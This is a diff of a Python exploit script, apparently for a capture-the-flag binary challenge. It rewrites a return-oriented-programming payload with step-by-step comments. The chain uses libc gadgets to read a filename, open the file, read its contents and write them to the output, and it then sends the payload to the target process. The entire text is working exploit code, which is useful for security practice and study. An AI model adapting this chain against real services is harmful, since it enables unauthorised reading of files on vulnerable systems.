@@ -48,11 +48,34 @@ def exploit(p):
 	openf=base+libc.symbols['open']
 
 	time.sleep(2)
-
-	payload=p64(rdi)+p64(0)+p64(rsi_r15)+p64(rbp+0x300)+p64(0)+p64(read)
-	payload+=p64(rdi)+p64(rbp+0x300)+p64(rsi_r15)+p64(0)+p64(rbp+0x300)+p64(openf)
-	payload+=p64(rdi)+p64(3)+p64(rsi_r15)+p64(rbp+0x400)+p64(0)+p64(read)
-	payload+=p64(rdi)+p64(1)+p64(rsi_r15)+p64(rbp+0x400)+p64(0)+p64(write)
+	# rdi=0, rsi=rbp+0x300, call read
+	payload=p64(rdi)
+	payload+=p64(0)
+	payload+=p64(rsi_r15)
+	payload+=p64(rbp+0x300)
+	payload+=p64(0)
+	payload+=p64(read)
+	# rdi=rbp+0x300, rsi=0, call open, rsi=0 -> O_RONLY
+	payload+=p64(rdi)
+	payload+=p64(rbp+0x300)
+	payload+=p64(rsi_r15)
+	payload+=p64(0)
+	payload+=p64(rbp+0x300)
+	payload+=p64(openf)
+	# rdi=3 (fd), rsi=rbp+0x400, call read
+	payload+=p64(rdi)
+	payload+=p64(3)
+	payload+=p64(rsi_r15)
+	payload+=p64(rbp+0x400)
+	payload+=p64(0)
+	payload+=p64(read)
+	# rdi=1, rsi=rbp+0x400, call write
+	payload+=p64(rdi)
+	payload+=p64(1)
+	payload+=p64(rsi_r15)
+	payload+=p64(rbp+0x400)
+	payload+=p64(0)
+	payload+=p64(write)
 
 	p.sendline(payload)
 
